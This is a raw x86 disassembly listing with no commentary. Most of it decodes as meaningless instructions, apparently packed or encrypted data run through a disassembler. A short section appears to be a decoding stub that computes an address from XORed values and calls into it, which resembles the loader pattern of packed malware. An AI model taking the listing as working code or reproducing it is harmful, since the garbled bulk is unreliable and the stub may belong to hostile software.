  40da35:	imul   ebx,DWORD PTR [esi],0x6dd1bd3
  40da3b:	sub    ecx,DWORD PTR [ebx]
  40da3d:	mov    ecx,0x6280d4fc
  40da42:	adc    ah,dl
  40da44:	push   ebx
  40da45:	test   al,0xcf
  40da48:	mov    ds:0x65c257d9,eax
  40da4d:	push   ebx
  40da4e:	add    DWORD PTR [eax+ebp*8+0x4a],esp
  40da52:	(bad)  
  40da53:	pushf  
  40da54:	dec    ecx
  40da55:	stos   BYTE PTR es:[edi],al
  40da56:	stos   DWORD PTR es:[edi],eax
  40da57:	outs   dx,DWORD PTR ds:[esi]
  40da58:	and    eax,0x56345f43
  40da5d:	jle    0x40d9f8
  40da5f:	cmp    ebx,DWORD PTR [ecx-0x30]
  40da62:	sbb    bh,ah
  40da64:	xchg   ebx,eax
  40da65:	fsubr  QWORD PTR [edx]
  40da67:	jmp    0x17a9:0xe1fe5760
  40da6e:	ds data16 clc 
  40da71:	sub    eax,DWORD PTR [edi]
  40da73:	mov    ah,0xc
  40da75:	and    ah,BYTE PTR [ecx-0x56652fe3]
  40da7b:	cmc    
  40da7c:	mov    eax,ds:0x3c77b206
  40da81:	or     DWORD PTR cs:[ecx+0x19],ebx
  40da85:	ins    DWORD PTR es:[edi],dx
  40da86:	jnp    0x40da4f
  40da88:	sahf   
  40da89:	xchg   ebp,eax
  40da8a:	sbb    edi,ecx
  40da8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da8d:	jmp    0xded:0x32c08ea7
  40da94:	fs jl  0x40dac6
  40da97:	push   0xfffffffe
  40da99:	sahf   
  40da9a:	(bad)  
  40da9b:	push   ds
  40da9c:	jl     0x40daaa
  40da9e:	inc    esi
  40da9f:	push   edi
  40daa0:	or     DWORD PTR [esi+ebp*1+0x50],ebp
  40daa4:	fnstsw WORD PTR [eax-0x1f68bbcc]
  40daaa:	xchg   esi,esi
  40daac:	rcr    BYTE PTR [eax-0x25],cl
  40daaf:	call   0xcf01144c
  40dab4:	gs jmp 0x40db18
  40dab7:	shr    DWORD PTR [eax],cl
  40dab9:	out    dx,al
  40daba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dabb:	imul   edx,DWORD PTR [edx-0x4d],0x65a43803
  40dac2:	ss jle 0x40da93
  40dac5:	nop
  40dac6:	push   ecx
  40dac7:	lahf   
  40dac8:	xor    ah,BYTE PTR [ebx+0x7f]
  40dacb:	in     eax,dx
  40dacc:	push   cs
  40dacd:	xor    dh,bl
  40dacf:	data16 jp 0x40db26
  40dad2:	into   
  40dad3:	lods   eax,DWORD PTR ds:[esi]
  40dad4:	cmovge esi,edi
  40dad7:	retf   0x2872
  40dada:	or     esp,ebx
  40dadc:	adc    bh,bh
  40dade:	cmp    eax,0xa829813e
  40dae3:	mov    esp,0x52e6ad38
  40dae8:	ds cwde 
  40daea:	ins    BYTE PTR es:[edi],dx
  40daeb:	daa    
  40daec:	jl     0x40da94
  40daee:	scas   al,BYTE PTR es:[edi]
  40daef:	leave  
  40daf0:	outs   dx,BYTE PTR ds:[esi]
  40daf1:	fnstenv [edi-0x4d]
  40daf4:	xor    BYTE PTR [ebx+0x77],dh
  40daf7:	xor    esp,ebp
  40daf9:	aad    0x5f
  40dafb:	sub    BYTE PTR [eax],0xa2
  40dafe:	cs push ebx
  40db00:	and    edi,0xdcc7b170
  40db06:	fidivr DWORD PTR ds:0x18d80e68
  40db0c:	ins    DWORD PTR es:[edi],dx
  40db0d:	sub    al,0x43
  40db0f:	loope  0x40db4c
  40db11:	sub    DWORD PTR ds:0x9abf6c8a,eax
  40db17:	aas    
  40db18:	mov    edx,0x727f8456
  40db1d:	mov    edi,0x64aa61be
  40db22:	or     eax,DWORD PTR [ecx+0x17]
  40db25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db26:	fstp   DWORD PTR [ebx-0xe]
  40db29:	xor    eax,0xb1a9868c
  40db2e:	lea    eax,[esi]
  40db30:	hlt    
  40db31:	jb     0x40dafd
  40db33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db34:	jle    0x40db1e
  40db36:	sub    DWORD PTR [eax+0x5c39112b],eax
  40db3c:	mov    eax,esi
  40db3e:	mov    edi,0xe52a4ce8
  40db43:	mov    cl,0x5f
  40db45:	(bad)  
  40db46:	push   edi
  40db47:	mov    dh,0xd9
  40db49:	ins    BYTE PTR es:[edi],dx
  40db4a:	retf   
  40db4b:	jns    0x40dad3
  40db4d:	retf   0xa0cb
  40db50:	int3   
  40db51:	ins    DWORD PTR es:[edi],dx
  40db52:	push   esi
  40db53:	je     0x40db22
  40db55:	pop    edi
  40db56:	jns    0x40db78
  40db58:	xchg   ebp,eax
  40db59:	out    0x1a,al
  40db5b:	clc    
  40db5c:	mov    ch,0x6e
  40db5e:	lahf   
  40db5f:	arpl   WORD PTR [ebx+0x8],dx
  40db62:	sar    BYTE PTR [esi+0x2e],1
  40db65:	pop    ss
  40db66:	and    ecx,DWORD PTR [ebx+0x488a6c5]
  40db6c:	inc    edx
  40db6d:	pop    esi
  40db6e:	in     eax,dx
  40db6f:	js     0x40dbbc
  40db71:	sub    eax,DWORD PTR [ebx-0x7d]
  40db74:	and    eax,0x77b49a29
  40db79:	test   DWORD PTR [ebx],ebp
  40db7b:	dec    ebp
  40db7c:	inc    eax
  40db7d:	mov    eax,ds:0x8084b21c
  40db82:	sub    eax,0x39749cd3
  40db87:	push   edi
  40db88:	and    bl,al
  40db8a:	mov    esp,0xb6817450
  40db8f:	mov    eax,ds:0xb34b9c76
  40db94:	mov    al,0xbf
  40db96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db97:	mov    al,ds:0x819fb5a1
  40db9c:	jmp    0xfd380044
  40dba1:	ins    BYTE PTR es:[edi],dx
  40dba2:	scas   eax,DWORD PTR es:[edi]
  40dba3:	ret    0x1a7d
  40dba6:	out    0xf6,eax
  40dba8:	and    al,0xb
  40dbaa:	mov    WORD PTR [esi-0x5b],ss
  40dbad:	loope  0x40db47
  40dbaf:	sbb    al,0x1f
  40dbb1:	retf   0x27f3
  40dbb4:	push   es
  40dbb5:	and    eax,0x45f6ef17
  40dbba:	pop    edi
  40dbbb:	rcl    DWORD PTR [edi+0x6576347e],1
  40dbc1:	cmc    
  40dbc2:	push   ds
  40dbc3:	std    
  40dbc4:	fisttp DWORD PTR [eax+0x3dc2936a]
  40dbca:	sub    DWORD PTR [ebx],0xffffffcb
  40dbcd:	fisubr WORD PTR ds:0xb7ec1c08
  40dbd3:	(bad)  
  40dbd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbd5:	mov    edi,0x38d1c1f6
  40dbda:	push   esi
  40dbdb:	inc    edi
  40dbdc:	fwait
  40dbdd:	scas   eax,DWORD PTR es:[edi]
  40dbde:	lock mov ah,0xff
  40dbe1:	mov    al,0x70
  40dbe3:	push   es
  40dbe4:	xchg   DWORD PTR [eax-0x4e],esp
  40dbe7:	or     al,0x3a
  40dbe9:	dec    edi
  40dbea:	jmp    0xf274c5d2
  40dbef:	push   ebx
  40dbf0:	sbb    ecx,DWORD PTR [eax+0x283974e2]
  40dbf6:	retf   0x6f57
  40dbf9:	mov    edi,0xc25b28fa
  40dbfe:	and    BYTE PTR [eax+0x2b0531cc],dh
  40dc04:	lods   al,BYTE PTR ds:[esi]
  40dc05:	shr    BYTE PTR [edi-0x7],1
  40dc08:	cwde   
  40dc09:	popf   
  40dc0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc0b:	mov    DWORD PTR [edx+edx*1-0x1f465220],edi
  40dc12:	jae    0x40dc25
  40dc14:	shr    BYTE PTR [ebp+0x28],0xae
  40dc18:	mov    gs,WORD PTR [edi]
  40dc1a:	mov    eax,0xc02fe3ca
  40dc1f:	mov    fs,WORD PTR [ecx+0x663df7f]
  40dc25:	cld    
  40dc26:	mov    DWORD PTR [esp+ebx*2],ecx
  40dc29:	cmc    
  40dc2a:	shr    BYTE PTR [esi+0x26],cl
  40dc2d:	xor    DWORD PTR [eax-0x7e1b5581],ebp
  40dc33:	cli    
  40dc34:	(bad)  
  40dc35:	pop    ebp
  40dc36:	jbe    0x40dc5e
  40dc38:	push   cs
  40dc39:	leave  
  40dc3a:	mov    ebx,0x338bea8c
  40dc3f:	btr    DWORD PTR [ecx-0x1b],esp
  40dc43:	stos   DWORD PTR es:[edi],eax
  40dc44:	pop    edx
  40dc45:	imul   ecx,DWORD PTR [edx-0x13],0xe7d0bd32
  40dc4c:	and    DWORD PTR [edi+ecx*8],ebx
  40dc4f:	inc    ebx
  40dc50:	jo     0x40dc82
  40dc52:	push   ss
  40dc53:	les    eax,FWORD PTR ds:0x241efd3b
  40dc59:	ret    
  40dc5a:	pop    ebx
  40dc5b:	stc    
  40dc5c:	jae    0x40dc1e
  40dc5e:	pop    ecx
  40dc5f:	(bad)  [eax-0x749cecfc]
  40dc65:	push   ebp
  40dc66:	or     BYTE PTR [ebx+0x1be9dc7d],cl
  40dc6c:	add    eax,DWORD PTR [eax]
  40dc6e:	add    dl,dh
  40dc70:	cmp    al,0x15
  40dc72:	adc    al,0x31
  40dc74:	aad    0xf3
  40dc76:	fcom   DWORD PTR [eax*8+0x1b52c898]
  40dc7d:	mov    eax,0x7e9a35de
  40dc82:	jle    0x40dd01
  40dc84:	jge    0x40dd04
  40dc86:	jle    0x40dc7c
  40dc88:	add    dl,dl
  40dc8a:	adc    bh,BYTE PTR [edx-0x13]
  40dc8d:	out    dx,eax
  40dc8e:	in     eax,0xfb
  40dc90:	int    0x69
  40dc92:	inc    ecx
  40dc93:	push   0x306f9ce0
  40dc98:	sub    eax,esp
  40dc9a:	push   ecx
  40dc9b:	(bad)  
  40dc9c:	repz shr DWORD PTR [ebx+0x18b3aa19],0x68
  40dca4:	jp     0x40dc48
  40dca6:	xlat   BYTE PTR ds:[ebx]
  40dca7:	or     BYTE PTR [ebp-0x3bad2365],dh
  40dcad:	mov    ebp,0x7743f72
  40dcb2:	repnz out dx,al
  40dcb4:	popf   
  40dcb5:	repz adc ebp,DWORD PTR ds:0x20da7a71
  40dcbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcbd:	nop
  40dcbe:	xor    DWORD PTR [ebp+0x39],ebp
  40dcc1:	xchg   BYTE PTR [eax+0x17ce3cbd],al
  40dcc7:	lea    ebp,[edx]
  40dcc9:	retf   
  40dcca:	cs inc ecx
  40dccc:	int    0x4c
  40dcce:	xchg   esi,eax
  40dccf:	gs dec ebp
  40dcd1:	mov    eax,ds:0xc9f46047
  40dcd6:	and    al,BYTE PTR [edi+0x5b642145]
  40dcdc:	push   ebp
  40dcdd:	stos   DWORD PTR es:[edi],eax
  40dcde:	dec    edx
  40dcdf:	pop    eax
  40dce0:	jecxz  0x40dcc6
  40dce2:	push   esi
  40dce3:	cwde   
  40dce4:	je     0x40dd14
  40dce6:	rol    bh,cl
  40dce8:	lods   al,BYTE PTR ds:[esi]
  40dce9:	clc    
  40dcea:	lods   al,BYTE PTR ds:[esi]
  40dceb:	jne    0x40dca3
  40dced:	mov    eax,0x2cc26c77
  40dcf2:	sbb    ebx,DWORD PTR [edx-0x663df310]
  40dcf8:	fnstenv ds:0x422658af
  40dcfe:	in     eax,dx
  40dcff:	fndisi(8087 only) 
  40dd01:	adc    BYTE PTR [edx],dl
  40dd03:	in     eax,dx
  40dd04:	sbb    ecx,ecx
  40dd06:	pop    es
  40dd07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd08:	test   eax,0xf0fef57b
  40dd0d:	xchg   ecx,eax
  40dd0e:	pop    esi
  40dd0f:	pop    ebp
  40dd10:	xchg   ecx,eax
  40dd11:	xchg   BYTE PTR [esi+0x6c60edba],ah
  40dd17:	jmp    0x40dcbc
  40dd19:	fndisi(8087 only) 
  40dd1b:	mov    esi,0xee5dd528
  40dd20:	aaa    
  40dd21:	xor    DWORD PTR [esi+ebx*8+0x53062ba],ebx
  40dd28:	pop    ebp
  40dd29:	jmp    0xd117a26d
  40dd2e:	jmp    0x6245417
  40dd33:	mov    BYTE PTR [eax],cl
  40dd35:	jmp    0x40dcc3
  40dd37:	push   eax
  40dd38:	fwait
  40dd39:	lahf   
  40dd3a:	lock push 0xffffffff
  40dd3d:	aas    
  40dd3e:	cwde   
  40dd3f:	cmp    eax,0x3b83f05f
  40dd44:	(bad)  
  40dd45:	xor    ecx,DWORD PTR ds:0xbb42d9b
  40dd4b:	pusha  
  40dd4c:	and    DWORD PTR [esi],ebp
  40dd4e:	and    DWORD PTR [edi+ebx*8-0x90998b8],0x30e525c3
  40dd59:	push   ss
  40dd5a:	js     0x40dd46
  40dd5c:	sub    bl,bl
  40dd5e:	add    al,0x81
  40dd60:	dec    esi
  40dd61:	(bad)  
  40dd63:	dec    esp
  40dd64:	mov    dl,0x9e
  40dd66:	xchg   ebp,eax
  40dd67:	push   edx
  40dd68:	and    bl,BYTE PTR [ebx+ebx*4]
  40dd6b:	sahf   
  40dd6c:	(bad)  
  40dd6d:	out    dx,eax
  40dd6e:	xor    eax,esp
  40dd70:	xor    eax,0xaf7e71a9
  40dd75:	out    dx,al
  40dd76:	mov    BYTE PTR [ecx+0x8922759],al
  40dd7c:	fs jb  0x40dd85
  40dd7f:	xchg   edx,eax
  40dd80:	lock push edi
  40dd82:	pop    ss
  40dd83:	stos   DWORD PTR es:[edi],eax
  40dd84:	jp     0x40dd32
  40dd86:	add    eax,0xa3e7a384
  40dd8b:	pop    ds
  40dd8c:	sub    eax,0x81307abb
  40dd91:	and    ecx,DWORD PTR [esi-0x3b22d410]
  40dd97:	fadd   QWORD PTR [eax+0x5864da81]
  40dd9d:	jnp    0x40ddd9
  40dd9f:	sbb    edi,DWORD PTR [eax+0x63b89239]
  40dda5:	test   eax,0x2766c1ea
  40ddaa:	div    BYTE PTR [edi+0x12efb777]
  40ddb0:	aad    0xd0
  40ddb2:	sub    dh,BYTE PTR [edi]
  40ddb4:	jle    0x40ddc6
  40ddb6:	adc    esp,edi
  40ddb8:	pop    ecx
  40ddb9:	mov    ecx,0x215daacb
  40ddbe:	push   eax
  40ddbf:	jbe    0x40de2d
  40ddc1:	push   esp
  40ddc2:	out    0x47,eax
  40ddc4:	adc    eax,0xc5fbe600
  40ddc9:	sub    bl,BYTE PTR [ebp-0x4c]
  40ddcc:	enter  0xc135,0x7f
  40ddd0:	ja     0x40dd8f
  40ddd2:	push   ecx
  40ddd3:	push   edx
  40ddd4:	inc    esp
  40ddd5:	mov    ecx,0xf99d378b
  40ddda:	inc    ebp
  40dddb:	sub    al,0x77
  40dddd:	lds    ebp,FWORD PTR [edi]
  40dddf:	adc    ebx,DWORD PTR [edi+0x65]
  40dde2:	ret    0xba27
  40dde5:	lods   eax,DWORD PTR ds:[esi]
  40dde6:	jg     0x40de64
  40dde8:	inc    ebx
  40dde9:	dec    ecx
  40ddea:	xchg   ebx,eax
  40ddeb:	inc    ecx
  40ddec:	jo     0x40ddba
  40ddee:	pop    ebp
  40ddef:	int    0xfb
  40ddf1:	push   edx
  40ddf2:	add    eax,0x344f96e
  40ddf7:	dec    edi
  40ddf8:	outs   dx,DWORD PTR cs:[esi]
  40ddfa:	lods   eax,DWORD PTR cs:[esi]
  40ddfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddfd:	xor    BYTE PTR [esi+edx*1],dh
  40de00:	jno    0x40de0d
  40de02:	sti    
  40de03:	adc    BYTE PTR es:[edi],bh
  40de06:	mov    eax,0x428e6835
  40de0b:	data16 fwait
  40de0d:	mov    dl,0xef
  40de0f:	inc    ebx
  40de10:	jg     0x40dde5
  40de12:	cmp    BYTE PTR [edi+0x4cbdebe9],dl
  40de18:	cmp    edi,esp
  40de1a:	ss test al,0xec
  40de1d:	sbb    al,0x5c
  40de1f:	imul   ebx,edx,0x1b
  40de22:	(bad)  
  40de23:	out    dx,eax
  40de24:	repz fidiv WORD PTR [edi+0x24cba292]
  40de2b:	dec    eax
  40de2c:	ficom  WORD PTR [esi]
  40de2e:	out    0xbd,eax
  40de30:	sar    DWORD PTR [edx-0x32eaafce],0x90
  40de37:	or     al,0x10
  40de39:	ins    DWORD PTR es:[edi],dx
  40de3a:	inc    edi
  40de3b:	pop    ebx
  40de3c:	addr16 dec esi
  40de3e:	popa   
  40de3f:	inc    esi
  40de40:	addr16 out 0x66,al
  40de43:	jbe    0x40de8b
  40de45:	push   ds
  40de46:	jg     0x40de58
  40de48:	popf   
  40de49:	ret    
  40de4a:	lahf   
  40de4b:	dec    ebx
  40de4c:	mov    al,ds:0xeded196a
  40de51:	cmp    esp,DWORD PTR [ebx+0x23]
  40de54:	jp     0x40de0f
  40de56:	xor    ebx,DWORD PTR [eax-0x7cf8c6ee]
  40de5c:	aad    0xfc
  40de5e:	daa    
  40de5f:	stos   DWORD PTR es:[edi],eax
  40de60:	mov    esi,0x8c2e2d4c
  40de65:	data16 sub al,0x34
  40de68:	adc    eax,0x87feb34f
  40de6d:	xor    al,0xf8
  40de6f:	mov    al,ds:0x38b14362
  40de74:	pop    edi
  40de75:	add    dh,BYTE PTR [eax+0x28]
  40de78:	cmc    
  40de79:	add    BYTE PTR [ebp+0x4b],0xf2
  40de7d:	daa    
  40de7e:	mov    ah,0x5
  40de80:	scas   eax,DWORD PTR es:[edi]
  40de81:	repnz outs dx,BYTE PTR ds:[esi]
  40de83:	call   0x68cd:0xa460104f
  40de8a:	push   ss
  40de8b:	mov    cl,0xd1
  40de8d:	sub    DWORD PTR [edi+0x16],ebp
  40de90:	pusha  
  40de91:	data16 lods al,BYTE PTR ds:[esi]
  40de93:	aaa    
  40de94:	hlt    
  40de95:	and    al,0x6
  40de97:	shl    BYTE PTR [eax+esi*4-0x51],1
  40de9b:	sbb    DWORD PTR [edx-0x7dd2685a],edx
  40dea1:	popf   
  40dea2:	sub    DWORD PTR [edx-0x6616d69f],ebp
  40dea8:	mov    ecx,0x91560040
  40dead:	jge    0x40de5d
  40deaf:	inc    eax
  40deb0:	pop    edi
  40deb1:	mov    fs,WORD PTR [edx-0x6d]
  40deb4:	fadd   QWORD PTR [ecx+ebx*8]
  40deb7:	(bad)  [edx]
  40deb9:	int3   
  40deba:	ror    DWORD PTR [eax+0x16],1
  40debd:	push   es
  40debe:	jp     0x40deb3
  40dec0:	mov    edx,ss
  40dec2:	mov    edx,0x1640ba63
  40dec7:	jmp    0x45c6b292
  40decc:	scas   eax,DWORD PTR es:[edi]
  40decd:	smsw   ecx
  40ded0:	js     0x40dedc
  40ded2:	inc    ebp
  40ded3:	inc    ebp
  40ded4:	ins    DWORD PTR es:[edi],dx
  40ded5:	ins    BYTE PTR es:[edi],dx
  40ded6:	pop    es
  40ded7:	sbb    DWORD PTR [ebx],edi
  40ded9:	frstor [eax+ecx*8+0x17]
  40dedd:	cdq    
  40dede:	inc    esp
  40dedf:	mov    esp,DWORD PTR [edi-0x4d49020f]
  40dee5:	ret    0x29c9
  40dee8:	push   ebp
  40dee9:	retf   0x57de
  40deec:	cwde   
  40deed:	mov    al,0x3f
  40deef:	push   es
  40def0:	retf   0xae8c
  40def3:	daa    
  40def4:	popf   
  40def5:	les    edi,FWORD PTR [eax+0x58531cd4]
  40defb:	loop   0x40df7a
  40defd:	fisubr WORD PTR [edi]
  40deff:	mov    esp,0x27c7a61f
  40df04:	or     eax,0x6eb4dd30
  40df09:	adc    eax,0x394c444b
  40df0e:	cmp    DWORD PTR [ecx],esi
  40df10:	outs   dx,BYTE PTR ds:[esi]
  40df11:	ins    DWORD PTR es:[edi],dx
  40df12:	inc    esp
  40df13:	and    BYTE PTR [eax-0x44],bl
  40df16:	jg     0x40df44
  40df18:	in     al,dx
  40df19:	sbb    DWORD PTR [edx-0x7],0xb5396ec1
  40df20:	mov    edi,DWORD PTR [esi]
  40df22:	call   0x952a:0x852c88d7
  40df29:	fisubr DWORD PTR [ecx+0x5a]
  40df2c:	xlat   BYTE PTR ds:[ebx]
  40df2d:	shl    dl,0xab
  40df30:	jp     0x40deea
  40df32:	xchg   ecx,eax
  40df33:	and    al,0x81
  40df35:	push   es
  40df36:	imul   edx,DWORD PTR [esi-0x6a],0xaa359a95
  40df3d:	out    0x24,eax
  40df3f:	xchg   ebx,eax
  40df40:	xchg   ebp,eax
  40df41:	pop    ss
  40df42:	call   FWORD PTR [eax]
  40df44:	(bad)  
  40df45:	mov    edi,0xd49a288e
  40df4a:	xchg   esp,esp
  40df4c:	xchg   esp,eax
  40df4d:	dec    eax
  40df4e:	clc    
  40df4f:	mov    gs,WORD PTR [esi-0x69da4c7b]
  40df55:	(bad)  
  40df56:	je     0x40df90
  40df58:	pop    edi
  40df59:	xor    BYTE PTR [eax-0x2086ad50],bl
  40df5f:	aad    0x22
  40df61:	or     eax,0x7494e711
  40df66:	into   
  40df67:	jnp    0x40defe
  40df69:	cs adc edi,ebp
  40df6c:	mov    ds:0xe86b3f67,eax
  40df71:	jns    0x40df51
  40df73:	(bad)  
  40df74:	mov    esi,0xf846f2c1
  40df79:	in     al,dx
  40df7a:	pop    ecx
  40df7b:	enter  0x913c,0xda
  40df7f:	mov    eax,ds:0x5310759d
  40df84:	outs   dx,DWORD PTR ds:[esi]
  40df85:	in     eax,dx
  40df86:	gs pushf 
  40df88:	mov    al,ds:0x97048999
  40df8d:	mov    eax,DWORD PTR [ebp-0x18]
  40df90:	mov    edx,DWORD PTR [ebp+0x8]
  40df93:	xor    eax,ecx
  40df95:	lea    eax,[eax+edx*1+0x32729b]
  40df9c:	mov    DWORD PTR [ebp+0x8],eax
  40df9f:	mov    eax,DWORD PTR [ebp-0x18]
  40dfa2:	mov    edx,DWORD PTR [ebp+0x14]
  40dfa5:	xor    eax,ecx
  40dfa7:	add    eax,esi
  40dfa9:	imul   eax,DWORD PTR [edx]
  40dfac:	mov    edx,DWORD PTR [ebp-0x4]
  40dfaf:	xor    edx,ecx
  40dfb1:	mov    ecx,DWORD PTR [ebp+0x8]
  40dfb4:	lea    ecx,[edx+ecx*1+0x32729b]
  40dfbb:	cmp    ecx,eax
  40dfbd:	jne    0x40d5f9
  40dfc3:	mov    ebx,esi
  40dfc5:	jmp    0x40dfcf
  40dfca:	mov    ebx,0x32729b
  40dfcf:	mov    eax,DWORD PTR [ebp-0x4]
  40dfd2:	xor    eax,0x7510854
  40dfd7:	add    eax,ebx
  40dfd9:	mov    DWORD PTR [ebp-0xc],eax
  40dfdc:	xor    ebx,ebx
  40dfde:	lea    eax,[ebp-0x10]
  40dfe1:	add    ebx,DWORD PTR [eax]
  40dfe3:	call   ebx
  40dfe5:	xor    ebx,ebx
  40dfe7:	inc    ebx
  40dfe8:	cmp    DWORD PTR [ebp+0x10],ebx
  40dfeb:	je     0x40e009
  40dff1:	xchg   edx,eax
  40dff2:	push   0xa
  40dff4:	pop    ecx
  40dff5:	push   0x4
  40dff7:	pop    ebx
  40dff8:	inc    ebx
  40dff9:	xchg   ebx,ecx
  40dffb:	sub    ebx,ecx
  40dffd:	xchg   ebx,ecx
  40dfff:	dec    ecx
  40e000:	mov    eax,DWORD PTR [ebp-0x1c]
  40e003:	imul   eax,ecx
  40e006:	add    esp,eax
  40e008:	xchg   edx,eax
  40e009:	push   eax
  40e00a:	xor    ebx,ebx
  40e00c:	mov    edx,esp
  40e00e:	dec    edx
  40e00f:	inc    ebx
  40e010:	add    ebx,DWORD PTR [edx+ebx*1]
  40e013:	jmp    0x40e333
  40e018:	lods   al,BYTE PTR ds:[esi]
  40e019:	and    bl,bl
  40e01b:	xchg   esp,eax
  40e01c:	jno    0x40e073
  40e01e:	jno    0x40e042
  40e020:	add    cl,cl
  40e022:	andps  xmm6,XMMWORD PTR cs:[ebp-0x66cf20c5]
  40e02a:	jle    0x40e0aa
  40e02c:	jge    0x40e0ab
  40e02e:	jle    0x40e0ae
  40e030:	shl    DWORD PTR [esi-0x7ac41808],cl
  40e036:	jp     0x40e020
  40e038:	inc    edi
  40e039:	push   ecx
  40e03a:	cmp    dh,ah
  40e03c:	push   0x3b
  40e03e:	push   ebp
  40e03f:	je     0x40e071
  40e041:	popa   
  40e042:	ins    DWORD PTR es:[edi],dx
  40e043:	sbb    eax,0xe13a099e
  40e048:	adc    ecx,DWORD PTR [edx-0x4d4ed167]
  40e04e:	outs   dx,DWORD PTR ds:[esi]
  40e04f:	mov    edx,0x9d918ee7
  40e054:	out    0x4e,eax
  40e056:	pop    ds
  40e057:	lods   al,BYTE PTR ds:[esi]
  40e058:	loope  0x40e03e
  40e05a:	xor    BYTE PTR [edx-0x50],bl
  40e05d:	jno    0x40e0bb
  40e05f:	pop    eax
  40e060:	mov    ds:0x9724e1f4,al
  40e065:	ret    
  40e066:	xor    BYTE PTR [ecx+0x3ba577e4],al
  40e06c:	or     ch,BYTE PTR [eax-0x16]
  40e06f:	(bad)  
  40e070:	push   0x1f94bd5d
  40e075:	push   esi
  40e076:	xlat   BYTE PTR ds:[ebx]
  40e077:	out    dx,al
  40e078:	xor    ch,BYTE PTR [edx+0xe10cd9d]
  40e07e:	fild   QWORD PTR [edi-0x3d]
  40e081:	je     0x40e09e
  40e083:	sar    BYTE PTR [esi+0x48858a9d],1
  40e089:	adc    eax,0x3cc127c8
  40e08e:	pop    esi
  40e08f:	fild   DWORD PTR [ebp+0x288389d9]
  40e095:	inc    esi
  40e096:	ins    BYTE PTR es:[edi],dx
  40e097:	jl     0x40e059
  40e099:	xchg   DWORD PTR [ebx-0x75375ef6],edi
  40e09f:	jbe    0x40e112
  40e0a1:	mov    dl,0x9a
  40e0a3:	mov    al,ds:0x2fabbc4a
  40e0a8:	xchg   esp,eax
  40e0a9:	jl     0x40e059
  40e0ab:	neg    ebx
  40e0ad:	jbe    0x40e03a
  40e0af:	xchg   bh,bh
  40e0b1:	and    eax,0x7707d456
  40e0b6:	and    DWORD PTR [ebp-0xf],esp
  40e0b9:	push   esp
  40e0ba:	mov    bx,0xd086
  40e0be:	out    dx,eax
  40e0bf:	out    0xcd,eax
  40e0c1:	mov    ebp,0xdbeedfc6
  40e0c6:	iret   
  40e0c7:	xor    al,0x36
  40e0c9:	sub    ecx,DWORD PTR [ebx+0x22]
  40e0cc:	push   0x4e
  40e0ce:	in     eax,0x39
  40e0d0:	sub    al,0x42
  40e0d2:	xchg   ebx,eax
  40e0d3:	sub    eax,0x21efd02
  40e0d8:	fwait
  40e0d9:	mov    ds:0x90d69341,al
  40e0de:	mov    ebp,esp
  40e0e0:	xchg   esi,eax
  40e0e1:	mov    al,0xd2
  40e0e3:	add    BYTE PTR [ecx-0x3d],ah
  40e0e6:	fwait
  40e0e7:	sub    eax,0x610a222b
  40e0ec:	adc    edi,ebx
  40e0ee:	jmp    0x26cf:0x7a1fe665
  40e0f5:	jecxz  0x40e15f
  40e0f7:	sti    
  40e0f8:	push   esi
  40e0f9:	enter  0xcb9e,0x4
  40e0fd:	shl    DWORD PTR [ebp+0x51],0x41
  40e101:	out    0x63,eax
  40e103:	fsqrt  
  40e105:	bnd jg 0x40e0be
  40e108:	xor    al,BYTE PTR [edx-0x49]
  40e10b:	ret    
  40e10c:	mov    cl,BYTE PTR [eax-0x5b]
  40e10f:	and    al,0x29
  40e111:	aam    0xab
  40e113:	jmp    0x2bdebef1
  40e118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e119:	mov    bl,BYTE PTR [edx]
  40e11b:	fdivr  DWORD PTR [edx]
  40e11d:	adc    DWORD PTR [eax+0x68],0x58
  40e121:	cli    
  40e122:	pop    ecx
  40e123:	sar    DWORD PTR [eax],cl
  40e125:	jge    0x40e170
  40e127:	gs loope 0x40e0c5
  40e12a:	mov    ebp,0x4bae98a5
  40e12f:	xchg   ecx,eax
  40e130:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e131:	lds    esi,FWORD PTR [edi]
  40e133:	sbb    ecx,esp
  40e135:	pop    edx
  40e136:	cmp    eax,0xb7ea33e3
  40e13b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e13c:	scas   al,BYTE PTR es:[edi]
  40e13d:	not    BYTE PTR [ecx+0x230788f2]
  40e143:	sahf   
  40e144:	mov    ds:0x1508f2ee,al
  40e149:	je     0x40e188
  40e14b:	mov    esi,DWORD PTR [esi+0x41969217]
  40e151:	push   cs
  40e152:	fwait
  40e153:	dec    ebp
  40e154:	fs or  al,0x2c
  40e157:	mov    dh,0x41
  40e159:	icebp  
  40e15a:	retf   0x3275
  40e15d:	and    edx,esi
  40e15f:	shl    bl,cl
  40e161:	fptan  
  40e163:	pop    ecx
  40e164:	mul    DWORD PTR [eax]
  40e166:	call   esi
  40e168:	sti    
  40e169:	xchg   edi,eax
  40e16a:	add    eax,0x73c05a8a
  40e16f:	es push edi
  40e171:	xchg   ecx,eax
  40e172:	or     BYTE PTR [esi+0x70],cl
  40e175:	lea    edi,[edi+eax*4]
  40e178:	xchg   esi,eax
  40e179:	scas   eax,DWORD PTR es:[edi]
  40e17a:	pop    ss
  40e17b:	add    edi,DWORD PTR [ecx+0x7d]
  40e17e:	jno    0x40e1e6
  40e180:	push   ds
  40e181:	idiv   BYTE PTR [eax+ebp*8]
  40e184:	add    eax,0x959e2caa
  40e189:	fisttp WORD PTR [ecx+0x4127fcd2]
  40e18f:	add    ebx,0x6f
  40e192:	je     0x40e117
  40e194:	xchg   edi,eax
  40e195:	jns    0x40e13e
  40e197:	nop
  40e198:	scas   al,BYTE PTR es:[edi]
  40e199:	hlt    
  40e19a:	xor    ah,BYTE PTR [esi+0x7e6db190]
  40e1a0:	xor    al,0xc
  40e1a2:	fist   DWORD PTR [ecx]
  40e1a4:	pop    eax
  40e1a5:	jmp    0x40e196
  40e1a7:	jmp    0x325a3038
